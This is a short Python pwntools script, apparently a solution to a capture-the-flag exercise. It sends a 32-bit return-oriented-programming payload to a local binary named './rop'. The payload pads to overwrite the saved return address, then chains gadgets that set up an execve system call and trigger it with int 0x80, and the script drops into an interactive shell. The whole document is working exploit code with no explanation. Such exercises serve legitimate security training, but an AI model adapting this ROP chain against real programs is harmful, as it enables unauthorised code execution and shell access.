from pwn import *
eaxaddr=0x080bb196
ebxaddr=0x0806eb90
# eax edx ecx ebx
straddr=0x080be408
intaddr=0x08049421

esp=0xff9022e0
ebp=0xff902368
offset=0x1c

payload = b"A" * (ebp-esp-offset+4) + p32(eaxaddr) +p32(0xb)+ p32(ebxaddr) +p32(0x0)+p32(0x0)+ p32(straddr) + p32(intaddr)
sh=process("./rop")
sh.sendline(payload)
sh.interactive()